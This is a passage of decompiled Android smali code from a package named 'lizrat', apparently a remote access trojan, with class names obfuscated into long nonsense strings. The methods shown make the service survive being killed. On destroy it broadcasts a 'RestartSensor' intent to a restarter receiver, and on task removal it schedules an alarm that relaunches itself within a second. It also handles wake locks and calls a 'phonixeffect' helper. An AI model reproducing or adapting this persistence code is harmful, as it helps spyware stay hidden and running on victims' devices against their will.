    sput-object v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->e_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_xc:Ljava/util/concurrent/Executor;

    .line 638
    invoke-static {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->p(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    return-void
.end method

.method public onDestroy()V
    .locals 4

    .line 93
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 94
    sput v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->s_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_f0:I

    .line 100
    :try_start_0
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "iamdone"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 107
    :catch_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, LLiz0rd/lizrat/SensorRestarterBroadcastReceiver;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "RestartSensor"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->sendBroadcast(Landroid/content/Intent;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 114
    :catch_1
    :try_start_2
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    .line 116
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-ne v0, v1, :cond_0

    .line 118
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 124
    :cond_0
    invoke-virtual {p0, v1}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->stopForeground(Z)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 8

    .line 42
    :try_start_0
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "Scanner"

    const-wide/32 v2, 0x2bf20

    invoke-static {v0, v1, v2, v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 43
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 44
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 46
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/high16 v2, 0x40000000    # 2.0f

    const/4 v3, 0x1

    invoke-static {v1, v3, v0, v2}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 47
    invoke-virtual {p0}, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/AlarmManager;

    const/4 v2, 0x3

    .line 50
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    add-long/2addr v4, v6

    .line 48
    invoke-virtual {v1, v2, v4, v5, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 52
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 54
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-ne v0, v3, :cond_0

    .line 56
    iget-object v0, p0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 60
    :catch_0
    :cond_0
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
